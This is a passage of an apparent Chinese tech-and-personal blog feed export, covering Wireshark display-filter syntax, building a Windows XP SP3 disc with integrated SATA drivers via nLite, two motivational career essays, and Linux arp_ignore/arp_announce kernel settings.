为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a><br>Wireshark的网站提供了对各种 <a href="http://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">协议以及它们子类的说明</a>。<br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425516.gif" alt="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt; <strong>String1, String2</strong> (可选项):<br>协议的子类。<br>点击相关父类旁的”+”号，然后选择其子类。<br><a href="http://openmaniak.com/wireshark/wireshark_display_filter_2.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425521.png" alt="wireshark filter expression" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a><br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425516.gif" alt="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt; <strong>Comparison operators （比较运算符）</strong>:<br>可以使用6种比较运算符：  </p><p>英文写法：</p><p>C语言写法：</p><p>含义：</p><p>eq</p><p>==</p><p>等于</p><p>ne</p><p>!=</p><p>不等于</p><p>gt</p><blockquote></blockquote><p>大于</p><p>lt</p><p>&lt;</p><p>小于</p><p>ge</p><blockquote><p>=</p></blockquote><p>大于等于</p><p>le</p><p>&lt;=</p><p>小于等于</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425516.gif" alt="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt; <strong>Logical expressions（逻辑运算符）</strong>:  </p><p>英文写法：</p><p>C语言写法：</p><p>含义：</p><p>and</p><p>&amp;&amp;</p><p>逻辑与</p><p>or</p><p>||</p><p>逻辑或</p><p>xor</p><p>^^</p><p>逻辑异或</p><p>not</p><p>!</p><p>逻辑非</p><p>被程序员们熟知的逻辑异或是一种排除性的或。当其被用在过滤器的两个条件之间时，只有当且仅当其中的一个条件满足时，这样的结果才会被显示在屏幕上。<br>让我们举个例子：<br>“tcp.dstport 80 xor tcp.dstport 1025”<br>只有当目的TCP端口为80或者来源于端口1025（但又不能同时满足这两点）时，这样的封包才会被显示。</p><p>例子：  </p><p><strong>snmp || dns || icmp</strong></p><p>显示SNMP或DNS或ICMP封包。</p><p><strong>ip.addr == 10.1.1.1</strong></p><p>显示来源或目的IP地址为10.1.1.1的封包。  </p><p><strong>ip.src != 10.1.2.3 or ip.dst != 10.4.5.6</strong></p><p>显示来源不为10.1.2.3或者目的不为10.4.5.6的封包。<br>换句话说，显示的封包将会为：<br>来源IP：除了10.1.2.3以外任意；目的IP：任意<br>以及<br>来源IP：任意；目的IP：除了10.4.5.6以外任意  </p><p><strong>ip.src != 10.1.2.3 and ip.dst != 10.4.5.6</strong></p><p>显示来源不为10.1.2.3并且目的IP不为10.4.5.6的封包。<br>换句话说，显示的封包将会为：<br>来源IP：除了10.1.2.3以外任意；同时须满足，目的IP：除了10.4.5.6以外任意  </p><p><strong>tcp.port == 25</strong></p><p>显示来源或目的TCP端口号为25的封包。</p><p><strong>tcp.dstport == 25</strong></p><p>显示目的TCP端口号为25的封包。</p><p><strong>tcp.flags</strong></p><p>显示包含TCP标志的封包。</p><p><strong>tcp.flags.syn == 0x02</strong></p><p>显示包含TCP SYN标志的封包。</p><p>如果过滤器的语法是正确的，表达式的背景呈绿色。如果呈红色，说明表达式有误。  </p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425524.gif" alt="wireshark display filter example" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</p><p>表达式正确</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425525.gif" alt="wireshark display filter example" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</p><p>表达式错误</p><p>您可以在<a href="http://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html" target="_blank" rel="noopener">Wireshark官方网站</a>或<a href="http://wiki.wireshark.org/DisplayFilters" target="_blank" rel="noopener">Wiki Wireshark website</a>上找到关于显示过滤器的补充信息。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>制作集成SATA、RAID和AHCI驱动的Windows XP sp3 安装光盘</title>
      <link href="/2010/05/24/create-a-windows-xp-sp3-with-integrated-sata-raid-and-ahci/"/>
      <url>/2010/05/24/create-a-windows-xp-sp3-with-integrated-sata-raid-and-ahci/</url>
      <content type="html"><![CDATA[<p>制作集成SATA、RAID和AHCI驱动的Windows XP sp3 安装光盘。  </p><p>微软已经把Windows XP SP3发布了，是个好消息。只是在安装过程中发现有一个问题还是没解决。<br>就是安装SATA、RAID和AHCI驱动还要用按F8键，用软驱安装相应程序（软驱毕竟很少用了）。  </p><p>解决办法如下：  </p><p>一、所需要的一些软件工具：<br>1、准备一张纯净版的Windows XP sp3 系统盘(或下载的系统映像文件)。<br>2、下载主板驱动<br>下载自己电脑主板的最新驱动程序。（或准备攒机用的主板驱动，本文用的是技嘉主板：GA-M770-DS3的主板驱动程序，支持AMD处理器）。  </p><p>nLite 1.4.1（自用）新版下载地址（该软件免激活，使用满意后可以捐款赞助）。<br><a href="http://www.duote.com/soft/7360.html" target="_blank" rel="noopener">http://www.duote.com/soft/7360.html</a><br>nLite需要Microsoft .NET Framework Version 2.0支持。<br>下载地址：<a href="http://www.duote.com/soft/4039.html" target="_blank" rel="noopener">http://www.duote.com/soft/4039.html</a>  </p><p>ULtraISO v9.0.0.2336.V9.0.0.2336（该软件需要激活码，网上可以找到。）<br>（可以配合nLite使用，不用单独准备系统安装盘，它可以直接提取下载的系统映像文件到指定位置）。<br>下载地址：<br><a href="http://www.duote.com/sofe/2808.html" target="_blank" rel="noopener">http://www.duote.com/sofe/2808.html</a><br>3、 刻录软件:用Nero 7.9.6.0或者其它的刻录软件也可以。  </p><p>4、空700M CD刻录光盘一张（要质量好的）。<br>二、制作光盘前的准备工作。<br>1、在可用空间1G以上的分区中建立一个文件夹,如D:\CD（nLite不支持中文名称,主要是放XP安装程序及驱动）。<br>2、在”CD”文件夹下再建立两个文件夹,如:XP和Driver。<br>3、用UltraISO把原版XP光盘里的（或下载的镜像文件）所有东西都提取到 D：\CD\XP 文件夹下。<br>4、把下载的主板驱动解压到 D：\CD\Driver 文件夹下。<br>5、准备工作完成。<br>三、把主板驱动整合到XP中,刻录光盘：<br>1、启动nLite,选择语言(选择Simplified Chinese为简体中文),点击“前进”。<br>2、在浏览中选择刚才复制到硬盘上的XP文件夹. D：\CD\XP ,选择完后软件开始检测.如果你的XP不是原版的,这一步会报错.说明你的XP安装文件是修改过的.找到原版的盘再试.如果没问题的话，点击”前进”<br>3、再点击”前进”<br>4、然后选中““驱动”和“可引导ISO镜像”两项，点击“前进”。<br>5、在“插入”中选择“多个驱动所在的文件夹”在弹出的对话框中,选择驱动的目录D：\CD\Driver。<br>6、在弹出的对话框中选择,刚才添加的驱动路径，点击“确定”。<br>7、在”文本模式整合选项”中会出现很多驱动，我们只选X86、SATA、RAID和AHCI。<br>8、选中后点击”确定”现在在界面中就应该有我们选择的驱动了,然后点击“前进”。<br>9、软件提示：“需要现在处理吗？点击是。处理完后,点击“前进”。<br>10、选择”创建ISO”指定一个地方”, 如E：winxpsp3，点“前进”就开始制作XP的镜像文件了。<br>11、镜像做完后,这样这个ISO镜像文件就集成SATA和sp3的驱动了。<br>12、找到镜像文件，选择用刻录软件刻录光盘映像文件。  </p><p>最后一张图片点击“前进”按钮，可以指定一个文件夹（如：E：winxpsp3）制作系统映像文件。用相关刻录软件找到它，即可刻录成系统光盘。  </p><p>刻录完成后,就制作好一张集成SATA驱动的WindowsXPsp3的安装盘。<br>制作完成后的文件大小为：600多MB，一张CD刻录盘就可以了。  </p><p>图片资料是用我已经制作完成的资源做的（只为演示制作过程）。不同硬件结果不尽相同，制作方法、过程基本一样（本文以技嘉主板GA-MA770-DS3为例）。  </p><p>此方法是新硬件遭遇老系统的解决办法之一。使新硬盘（SATA）不在工作在IDE模式了，且不用启动按F8键装入软盘了，软驱已经很少了。可以组成磁盘阵列。<br>制作过程中也可以把声卡、显卡、网卡等硬件驱动程序集成进去，方便自己以后使用。<br>（缺点：只能用在自己电脑重装系统，只集成SATA驱动可以用在其他需要SATA驱动的电脑上）。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>谈时间的利用</title>
      <link href="/2010/05/21/talk-about-the-use-of-time/"/>
      <url>/2010/05/21/talk-about-the-use-of-time/</url>
      <content type="html"><![CDATA[<p>时间对于每个人来说是十分公平的，每个人只能过一生，每个人每天都是24小时，大家都在用每天24小时的时间做着自己认为有意义的事情。</p><pre><code>人与人的差距，除了出生环境存在的差距，运气产生的差距，最大的差距实际上就是利用时间的差距。每个人都会有一个目标，有些人用自己的腿向目标迈进，有些人骑自行车，有些人开汽车，有些人乘飞机。最终乘飞机的人是走得最远的，靠两条腿走路的人所走的距离是最短的。有效地利用时间，是一个人成功的关键。你不一定要将自己的时间安排的很满，故事中的悬梁刺股，夜以继日地学习与工作，那属于变态地利用时间，是不可取的。你想想，一个人没有充足地休息时间，精神都没了，他还有充沛的精力和活跃的思维能力吗？所以，保证良好的睡眠和休息时间是必须的。除了睡眠与休息，你还要给自己空出时间来学习新知识，来思考问题，来反省自我。每个人都应该对自己所做的事情做横向、纵向地比较，很多人往往缺乏这样的比较，横向比较就是和身边的人比，纵向比较就是和更上面的人比。学习、思考、反省的时间必须要留出来，不给自己留这些时间的人等于把自己思想生命给休眠了，等于是阻止了自己的进步。想想，这个世界多少人自己在阻止自己的进步啊？很可怕，这样的人口比例估计在70%以上。留足了休息、思考时间之后，开始安排工作的时间。你的工作就像去一个目的地，走路不花钱，骑自行车更快些，坐汽车要花钱，乘飞机花钱更多。请你从今天开始，只要有着够乘飞机的钱一定要乘飞机，够坐汽车的钱一定要坐汽车，实在没钱坐汽车一定要骑自行车，千万别选择靠两条腿走路。因为等你走到了原定的目的地，新的目的地恐怕已经不在那里了。人生的过程实际上就是不断寻找新的目的地的过程，每个目的地可能都会有着不同的宝藏，你走路到达一个目的地的时候骑车的可能已经到达了三个目的地了，坐汽车的人可能已经到达了十个目的地，乘飞机的可能已经走过了三十、五十个目的地了；人生差距就这样产生了。这里所说的走路、骑车、乘飞机只是个比方，千万别钻牛角尖。除了靠工具比速度，最关键地还是要比目标的判断能力。虽然你开始没钱坐汽车，更没钱乘飞机，但你要是能比坐汽车、乘飞机的人具有更加准确的目标判断力，你也能做到后来者居上。比如他乘飞机到达了30个目标点，每个目标点平均发现1万元宝藏，那么他共挖掘到30万的财富。但如果你判断目标点的能力比他强，虽然你骑车只到达3个目标点，但你的每个目标点能挖掘10万元宝藏的话，你同样也能挖掘到30万的财富，但是在下一轮的比赛中你肯定能赢，因为你也有能力乘飞机了。他能够跑30个目标点，你同样能够跑30个目标点，他继续挖掘30万的财富，而你挖掘到的财富则是300万。所以，不管你现在是摆摊的小贩，还是挖煤的老板，积累自身的知识，发展自身的能力最重要。判断目标点宝藏的价值很重要，但知道获得目标点宝藏所需要的时间更重要。如果1类目标点是10万宝藏需要耗费1年，而另一类目标点是1万宝藏需要耗费半个月。千万不要被10万数字迷惑了眼睛，因为去挖掘1万的宝藏同样花1年时间你能挖掘出24万的财富来。如果你长期不去不比较，一比会吓你一跳。随着时间的推移，同样是背着小书包一起上小学的同学，你可能下岗了，而你的同学站在天安门城楼上通过电视里向你招手呢。人与人之间无论是身高、体重、速度、力量等方面的差别都不会太大，不会相差10倍的差距。产生最大差距的就是双方利用时间所产生的知识、思想、财富上的差距。好好利用你的时间吧，把你的时间都用在做有意义的事情上面，用在你所能想到的最能产生最大价值的事情上面，通过时间的积累，通过你不断地思考、比较、纠正方向；你一定能赶超你身边的人，一定能取得更大的成功。</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>毕业后的五年拉开大家差距的原因</title>
      <link href="/2010/05/12/the-reason-for-the-gap-in-the-five-years-after-graduation/"/>
      <url>/2010/05/12/the-reason-for-the-gap-in-the-five-years-after-graduation/</url>
      <content type="html"><![CDATA[<p>有人工作，有人继续上学，大家千万不要错过这篇文章，能看到这篇文章也是一种幸运，真的受益匪浅，对我有很大启迪，这篇文章将会改变我的一生，真的太好了，希望与有缘人分享，也希望对有缘人有所帮助！看完之后有种“相见恨晚”的感觉，特别激动，希望大家好好的珍藏这篇文章，相信多年以后，再来看这篇文章，一定有不同的感觉。</p><pre><code>正如&quot;打工皇帝&quot;唐骏说：&quot;我觉得有两种人不要跟别人争利益和价值回报。第一种人就是刚刚进入企业的人，头5年千万不要说你能不能多给我一点儿工资，最重要的是能在企业里学到什么，对发展是不是有利……&quot;人总是从平坦中获得的教益少，从磨难中获得的教益多；从平坦中获得的教益浅，从磨难中获得的教益深。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。最要紧的是先练好内功，毕业后这5年就是练内功的最佳时期，练好内功，才有可能在未来攀得更高。出路在哪里？出路在于思路！</code></pre><p>　　其实，没有钱、没有经验、没有阅历、没有社会关系，这些都不可怕。没有钱，可以通过辛勤劳动去赚；没有经验，可以通过实践操作去总结；没有阅历，可以一步一步去积累；没有社会关系，可以一点一点去编织。但是，没有梦想、没有思路才是最可怕的，才让人感到恐惧，很想逃避!</p><p>　　人必须有一个正确的方向。无论你多么意气风发，无论你是多么足智多谋，无论你花费了多大的心血，如果没有一个明确的方向，就会过得很茫然，渐渐就丧失了斗志，忘却了最初的梦想，就会走上弯路甚至不归路，枉费了自己的聪明才智，误了自己的青春年华。</p><pre><code>荷马史诗《奥德赛》中有一句至理名言：&quot;没有比漫无目的地徘徊更令人无法忍受的了。&quot;毕业后这5年里的迷茫，会造成10年后的恐慌，20年后的挣扎，甚至一辈子的平庸。如果不能在毕业这5年尽快冲出困惑、走出迷雾，我们实在是无颜面对10年后、20年后的自己。毕业这5年里，我们既有很多的不确定，也有很多的可能性。</code></pre><p>　　毕业这5年里，我们既有很多的待定，也有很多的决定。</p><p>　　迷茫与困惑谁都会经历，恐惧与逃避谁都曾经有过，但不要把迷茫与困惑当作可以自我放弃、甘于平庸的借口，更不要成为自怨自艾、祭奠失意的苦酒。生命需要自己去承担，命运更需要自己去把握。在毕业这5年里，越早找到方向，越早走出困惑，就越容易在人生道路上取得成就、创造精彩。无头苍蝇找不到方向，才会四处碰壁；一个人找不到出路，才会迷茫、恐惧。</p><pre><code>生活中，面对困境，我们常常会有走投无路的感觉。不要气馁，坚持下去，要相信年轻的人生没有绝路，困境在前方，希望在拐角。只要我们有了正确的思路，就一定能少走弯路，找到出路！    成功的人不是赢在起点，而是赢在转折点。不少刚刚毕业的年轻人，总是奢望马上就能找到自己理想中的工作。然而，很多好工作是无法等来的，你必须选择一份工作作为历练。职业旅程中的第一份工作，无疑是踏入社会这所大学的起点。也许你找了一份差强人意的工作，那么从这里出发，好好地沉淀自己，从这份工作中汲取到有价值的营养，厚积薄发。千里之行，始于足下，只要出发，就有希望到达终点。起点可以相同，但是选择了不同的拐点，终点就会大大不同！毕业这几年，我们的生活、感情、职业等都存在很多不确定的因素，未来也充满了各种可能。这个时候，必须学会选择，懂得放弃，给自己一个明确的定位，使自己稳定下来。如果你不主动定位，就会被别人和社会&quot;定型&quot;！</code></pre><p>　　可以这么说：一个人在毕业这5年培养起来的行为习惯，将决定他一生的高度。我们能否成功，在某种程度上取决于自己对自己的评价，这就是定位。你给自己定位是什么，你就是什么。定位能决定人生，定位能改变命运。丑小鸭变成白天鹅，只要一双翅膀；灰姑娘变成美公主，只要一双水晶鞋。</p><pre><code>人的命，三分天注定，七分靠打拼，有梦就&quot;会红&quot;，爱拼才会赢。只要不把自己束缚在心灵的牢笼里，谁也束缚不了你去展翅高飞。现实情况远非他们所想的那样。于是，当优越感逐渐转为失落感甚至挫败感时，当由坚信自己是一块&quot;金子&quot;到怀疑自己是一粒&quot;沙子&quot;时，愤怒、迷茫、自卑就开始与日俱增。其实，应该仔细掂量一下自己，你是否真是金子？是真金，手中要有绝活，才能上要有过人之处才行。一句话：真金是要靠实力来证明的，只有先把自己的本领修炼好了，才有资格考虑伯乐的事情</code></pre><p>   每颗珍珠原本都是一粒沙子，但并不是每一粒沙子都能成为一颗珍珠。</p><p>   想要卓尔不群，就要有鹤立鸡群的资本。忍受不了打击和挫折，承受不住忽视和平淡，就很难达到辉煌。年轻人要想让自己得到重用，取得成功，就必须把自己从一粒沙子变成一颗价值连城的珍珠。</p><pre><code>    天有下雨与日出，人生高峰与低谷。    莫为浮云遮望眼，风物长宜放眼量。只要拂去阴霾，就能亮出朗朗晴空。如果你在工作上有些不如意，要相信自己不会一直处于人生的低谷期，总有一天能冲破重重云层。告诉自己：我并没有失败，只是暂时没有成功！只要在内心点亮一盏希望之灯，一定能驱散黑暗中的阴霾，迎来光明。的确，论资历，他们是不折不扣的职场菜鸟，业务涉及不深，人脉一穷二白，在工作中经常碰壁。他们的压力并不一定都像千钧大石，而是像大雨来临前的天色，灰色低沉，明明有空间，却被灰色填满每个缝隙，只能等待大雨倾盆之后的晴空。</code></pre><p>　　“起得比鸡早，睡得比狗晚，干得比驴多，吃得比猪差。”这是很多刚刚毕业的人喜欢用来调侃自己生活状态的话。虽然有点儿夸张，但是，他们中的很多人的确一直都被灰色心情所笼罩–心里永远是多云转阴。记得有位哲人曾说：”我们的痛苦不是问题本身带来的，而是我们对这些问题的看法产生的。”换个角度看人生，是一种突破、一种解脱、一种超越、一种高层次的淡泊与宁静，从而获得自由自在的快乐。</p><pre><code>一位哲人说：&quot;人生就是一连串的抉择，每个人的前途与命运，完全把握在自己手中，只要努力，终会有成。&quot;就业也好，择业也罢，创业亦如此，只要奋发努力，都会成功。你是不是准备把生命的承诺全部都交给别人？</code></pre><p>　　毕业后这5年，是改变自己命运的黄金时期。在最能决定自己命运时，如果还不把握，那你还要等到什么时候呢？我的人生我做主，命运由己不由人。</p><p>　　不要活在别人的嘴里，不要活在别人的眼里，而是把命运握在自己手里。</p><p>　　别说你没有背景，自己就是最大的背景。美国作家杰克·凯鲁亚克说过一句话：”我还年轻，我渴望上路。”在人生的旅途中，我们永远都是年轻人，每天都应该满怀渴望。每个人的潜能都是无限的，关键是要发现自己的潜能和正确认识自己的才能，并找到一个能充分发挥潜能的舞台，而不能只为舞台的不合适感到不快。要客观公正地看待自己的能力，结合自己的实际情况和爱好冷静选择，尽可能到最需要自己、最适合自己的地方。</p><p>　    在人力资源管理界，特别流行一个说法，即”骑马，牵牛，赶猪，打狗”理论：人品很好，能力又很强的，是千里马，我们要骑着他；人品很好但能力普通的，是老黄牛，我们要牵着他；人品、能力皆普通的，就是”猪”，我们要赶走他；人品很差能力很强的，那是”狗”，我们要打击他。</p><pre><code>我想，刚刚毕业几年的你，一样胸怀大志，一样想成为一匹被人赏识、驰骋沙场的千里马吧？那么，就好好沉淀下来。低就一层不等于低人一等，今日的俯低是为了明天的高就。所谓生命的价值，就是我们的存在对别人有价值。能被人利用是一件好事，无人问津才是真正的悲哀！能干工作、干好工作是职场生存的基本保障。任何人做工作的前提条件都是他的能力能够胜任这项工作。能干是合格员工最基本的标准，肯干则是一种态度。一个职位有很多人都能胜任，都有干好这份工作的基本能力，然而，能否把工作做得更好一些，就要看是否具有踏实肯干、苦于钻研的工作态度了。在能干的基础上踏实肯干。工作中，活干得比别人多，你觉得吃亏；钱拿得比别人少，你觉得吃亏；经常加班加点，你觉得吃亏……其实，没必要这样计较，吃亏不是灾难，不是失败，吃亏也是一种生活哲学。现在吃点儿小亏，为成功铺就道路，也许在未来的某个时刻，你的大福突然就来了。能吃亏是做人的一种境界，是处世的一种睿智。在工作中并不是多做事或多帮别人干点儿活就是吃亏。如果领导让你加加班、赶赶任务，别以为自己吃了大亏，反而应该感到庆幸，因为领导只叫了你，而没叫其他人，说明他信任你、赏识你。吃亏是一种贡献，你贡献得越多，得到的回报也就越多。乐于加班，就是这样的一种吃亏。舍得舍得，有舍才有得；学会在适当时吃些亏的人绝对不是弱智，而是大智。</code></pre><p>　　给别人留余地就是给自己留余地，予人方便就是予己方便，善待别人就是善待自己。</p><p>　　傻人有傻福，因为傻人没有心计。和这样的人在一起，身心放松，没有太多警惕，就能相互靠近。傻在很多时候意味着执着和忠贞，也意味着宽厚和诚实，让人不知不觉站到他一边。傻人无意中得到的，比聪明人费尽心机得到的还多。毕业这几年，你的天空中只飘着几片雪花，这样你就满足了吗？成功需要坚持与积累，与其专注于搜集雪花，不如省下力气去滚雪球。巴菲特说：”人生就像滚雪球，最重要的是发现很湿的雪和很长的坡。”让自己沉淀下来，学着发现”很湿的雪”，努力寻找”很长的坡”。记住：散落的雪花会很快融化，化为乌有，只有雪球才更实在，才能长久。</p><p>在毕业这几年里，你要是能做到比别人多付出一分努力，就意味着比别人多积累一分资本，就比别人多一次成功的机会。</p><pre><code>什么是职业化呢？职业化就是工作状态的标准化、规范化、制度化，即在合适的时间、合适的地点用合适的方式说合适的话、做合适的事，使知识、技能、观念、思维、态度、心理等符合职业规范和标准。&quot;在每个行业里，都有很多出色的人才，他们之所以能存在，是因为比别人更努力、更智慧、更成熟。但是，最重要的是，他们比一般人更加职业化！这就是为什么我现在能当你老板的原因。一个人仅仅专业化是不够的，只有职业化的人才能飞在别人前面，让人难以超越！&quot;不要以为我们现在已经生存得很安稳了。对于毕业5年的人来讲，一定要认清即将面临的五大挑战。</code></pre><p>一、赡养父母。</p><p>二、结婚生子。</p><p>三、升职加薪。</p><p>四、工作压力。</p><p>五、生活质量。</p><pre><code>有的人为生存而雀跃，目光总是停在身后，三天打鱼两天晒网，有始无终。</code></pre><p>　  有的人为发展而奋斗，目光总是盯在正前方，每天进步一点点，坚持不懈。</p><p>　　毕业这几年，不能没有追求和探索，不能没有理想和目标。人生如逆水行舟，不进则退。甘于现状的生活就是不再前行的船，再也无法追上时代前进的步伐。一定要抓紧每一秒钟的时间来学习，要明白学习不是学生的专利。小聪明的人最得意的是：自己做过什么？大智慧的人最渴望的是：自己还要做什么？</p><p>　　小聪明是战术，大智慧是战略；小聪明看到的是芝麻，大智慧看到的是西瓜。</p><p>　　在这个世界上，既有大人物，也有小角色，大人物有大人物的活法，小人物有小人物的潇洒，每个人都有自己的生活方式，谁也勉强不了谁。但是，小聪明只能有小成绩和小视野，大智慧才能有大成就和大境界。小企业看老板，中企业看制度，大企业看文化。</p><pre><code>小公司与大企业都有生存之道，没有好坏之分，但对一个人不同阶段的影响会不同。</code></pre><p>　　小公司肯定想要发展为大企业，这是一种目标，年轻人也要给自己的职业生涯制定目标。毕业几年的你，是否经常会怯场或者是感到没有底气？居安思危绝对不是危言耸听！此刻打盹，你将做梦；此刻学习，你将圆梦。在竞争激烈的人生战场上，打盹的都是输家！</p><p>   每个人在年轻的时候似乎都豪情万丈，什么都不怕，可是随着年龄的增长，每天想着房子、工作、养家糊口这些俗事儿，再也没有年轻时那种敢于”上天探星、下海捞月”的勇气了。是我们改变了生活，还是生活改变了我们？我们的思想越来越复杂，因为有了越来越多的舍不得、越来越多的顾虑，我们总是在徘徊、总是在犹豫。毕业开始一两年，生活的重担会压得我们喘不过气来，挫折和障碍堵住四面八方的通口，我们往往在压迫得自己发挥出潜能后，才能杀出重围，找到出路。可是两三年后，身上的重担开始减轻，工作开始一帆风顺，我们就松懈了下来，渐渐忘记了潜在的危险。直到有一天危机突然降临，我们在手足无措中被击败……毕业这几年，仍然处于危险期，一定要有居安思危的意识，好好打拼，这样才能有一个真正的安全人生！</p><pre><code>生于忧患，死于安乐。如果你想跨越自己目前的成就，就不能画地自限，而是要勇于接受挑战。对畏畏缩缩的人来说，真正的危险正在于不敢冒险！年轻人在社会的重压下，适应能力已变得越来越强，只是他们不自觉地习惯被环境推着走。他们不敢冒险，怕给自己带来终身的遗憾，于是告慰自己：&quot;我对得起自己、对得起家人，因为我已竭尽全力。&quot;其实，人只有不断挑战和突破才能逐渐成长。长期固守于已有的安全感中，就会像温水里的青蛙一样，最终失去跳跃的本能。经历了这几年社会生活，你应该明白：这个世界上有富也有贫，有阴也有亮，有丑也有美，到底看到什么，取决于自己是积极还是消极。在年轻时学会勤勉地工作，用一种光明的思维对待生活，那么，只要张开手掌，你就会发现，里面有一片灿烂的人生。把感恩刻在石头上，深深地感谢别人帮助过你，永远铭记，这是人生应有的一种境界；把仇恨写在沙滩上，淡淡忘掉别人伤害过你，学会宽容，让所有的怨恨随着潮水一去不复返，这也是一种人生境界。学会倒出水，才能装下更多的水。从毕业那天开始，学会把每天都当成一个新的起点，每一次工作都从零开始。如果你懂得把&quot;归零&quot;当成一种生活的常态，当成一种优秀的延续，当成一种时刻要做的事情，那么，经过短短几年，你就可以完成自己职业生涯的正确规划与全面超越。</code></pre><p>　　在职业起步的短短道路上，想要得到更好、更快、更有益的成长，就必须以归零思维来面对这个世界。不要以大学里的清高来标榜自己，不要觉得自己特别优秀，而是要把自己的姿态放下，把自己的身架放低，让自己沉淀下来，抱着学习的态度去适应环境、接受挑战。放下”身段”才能提高身价，暂时的俯低终会促成未来的高就。</p><p>　　年轻人从校园或者从一个环境进入一个新环境，就要勇于将原来环境里熟悉、习惯、喜欢的东西放下，然后从零开始。我们想在职场上获得成功，首先就要培养适应力。从自然人转化为单位人是融入职场的基本条件。一个人起点低并不可怕，怕的是境界低。越计较自我，便越没有发展前景；相反，越是主动付出，那么他就越会快速发展。很多今天取得一定成就的人，在职业生涯的初期都是从零开始，把自己沉淀再沉淀、倒空再倒空、归零再归零，正因为这样，他们的人生才一路高歌，一路飞扬。</p><p>　　在毕业这几年里，我们要让过去归零，才不会成为职场上那只背着重壳爬行的蜗牛，才能像天空中的鸟儿那样轻盈地飞翔。请好好品味一下杰克·韦尔奇说过的一句话：”纠正自己的行为，认清自己，从零开始，你将重新走上职场坦途。”　吐故才能纳新，心静才能身凉，有舍才能有得，杯空才能水满，放下才能超越。</p><pre><code>归零思维五大表现：心中无我，眼中无钱，念中无他，朝中无人，学无止境。年轻人难免带着几分傲气，认为自己无所不能、所向披靡，其实不然，初入职场的新人还是个&quot;婴儿&quot;，正处在从爬到走的成长阶段。在毕业这几年里，一定要让自己逐步培养起学徒思维、海绵思维、空杯思维，具有这样思维的人心灵总是敞开的，能随时接受启示和一切能激发灵感的东西，他们时刻都能感受到成功女神的召唤。</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>arp_ignore和arp_announce内核参数</title>
      <link href="/2010/03/26/arp-ignore-and-arp-announce-kernel-parameters/"/>
      <url>/2010/03/26/arp-ignore-and-arp-announce-kernel-parameters/</url>
      <content type="html"><![CDATA[<p>arp_announce : INTEGER</p><p>默认为0</p><p>对网络接口上本地IP地址发出的ARP回应作出相应级别的限制:</p><p>确定不同程度的限制,宣布对来自本地源IP地址发出Arp请求的接口</p><p>0 - (默认) 在任意网络接口上的任何本地地址</p><p>1 -尽量避免不在该网络接口子网段的本地地址. 当发起ARP请求的源IP地址是被设置应该经由路由达到此网络接口的时候很有用.此时会检查来访IP是否为所有接口上的子网段内ip之一.如果改来访IP不属于各个网络接口上的子网段内,那么将采用级别2的方式来进行处理.</p><p>2 - 对查询目标使用最适当的本地地址.在此模式下将忽略这个IP数据包的源地址并尝试选择与能与该地址通信的本地地址.首要是选择所有的网络接口的子网中外出访问子网中包含该目标IP地址的本地地址. 如果没有合适的地址被发现,将选择当前的发送网络接口或其他的有可能接受到该ARP回应的网络接口来进行发送</p><p>all/ 和{interface}/ 下两者同时比较，取较大一个值生效.</p><p>提高约束级别有益于从指定的目标接受应答,而降低级别可以给予更多的arp查询者以反馈信息(关于arp代理这一段我普遍翻译地不好，去啃一下tcp/ip bible的卷一，然后再翻译吧)</p><p>arp_ignore : INTEGER</p><p>默认为0</p><p>定义对目标地址为本地IP的ARP询问不同的应答模式</p><p>0 - (默认值): 回应任何网络接口上对任何本地IP地址的arp查询请求（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,那么即使eth0收到来自10.1.1.2这样地址发起的对10.1.1.1 的arp查询也会回应–而原本这个请求该是出现在eth1上，也该有eth1回应的）</p><p>1 - 只回答目标IP地址是来访网络接口本地地址的ARP查询请求（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,那么即使eth0收到来自10.1.1.2这样地址发起的对192.168.0.1的查询会回答，而对10.1.1.1 的arp查询不会回应）</p><p>2 -只回答目标IP地址是来访网络接口本地地址的ARP查询请求,且来访IP必须在该网络接口的子网段内（比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,eth1收到来自10.1.1.2这样地址发起的对192.168.0.1的查询不会回答，而对192.168.0.2发起的对192.168.0.1的arp查询会回应）</p><p>3 - 不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出回应(do not reply for local addresses configured with scope host,only resolutions for global and link addresses are replied 翻译地似乎不好，这个我的去问问人)</p><p>4-7 - 保留未使用</p><p>8 -不回应所有（本地地址）的arp查询</p><p>all/ 和{interface}/ 下两者同时比较，取较大一个值生效.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>apache ab详解</title>
      <link href="/2010/03/16/apache-ab/"/>
